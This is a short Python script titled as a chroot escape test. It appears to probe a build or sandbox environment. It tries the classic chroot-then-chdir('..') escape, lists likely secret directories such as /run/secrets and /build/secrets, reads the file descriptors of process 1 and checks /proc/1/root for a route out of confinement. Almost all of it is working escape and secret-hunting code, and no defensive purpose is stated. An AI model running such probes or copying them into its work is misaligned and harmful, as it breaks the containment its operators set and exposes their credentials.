import os
print('=== CHROOT ESCAPE TEST ===')
print('cwd:', os.getcwd())
print('mountinfo (self):')
try:
    for ln in open('/proc/self/mountinfo'):
        if '/build' in ln or 'rootfs' in ln or ' / ' in ln.split(' - ')[0]: print('  ',ln.strip()[:180])
except Exception as e: print(e)
# Classic chroot escape: mkdir, chroot into it repeatedly, then chroot(".") from above
os.makedirs('/tmp/e', exist_ok=True)
try:
    os.chroot('/tmp/e')
    print('chroot /tmp/e OK, cwd now:', os.getcwd())
except Exception as e: print('chroot /tmp/e:',type(e).__name__,e)
# after chroot, try to escape by chdir .. many times then chroot .
try:
    for i in range(10):
        try: os.chdir('..')
        except Exception: break
    print('after chdir-up, cwd:', os.getcwd())
    print('ls cwd:', os.listdir('.')[:20])
except Exception as e: print('chdir:',type(e).__name__,e)
print('=== /secrets via any path ===')
for p in ['/secrets','/run/secrets','/build/input/secrets','/build/secrets','/var/secrets','/etc/aiven/secrets']:
    try: print(p, os.listdir(p))
    except Exception as e: print(p, type(e).__name__)
print('=== /proc/1/fd direct open (not readlink) ===')
for fd in range(0,20):
    try:
        t=os.readlink('/proc/1/fd/%d'%fd); print('fd',fd,t)
    except Exception: pass
print('=== /proc/1/cwd/../ openable? ===')
for p in ['/proc/1/cwd','/proc/1/root','/proc/1/exe','/proc/1/cwd/..','/proc/1/root/..']:
    try:
        st=os.stat(p); print(p,'stat ok',st.st_ino)
    except Exception as e: print(p,type(e).__name__)
print('DONE')
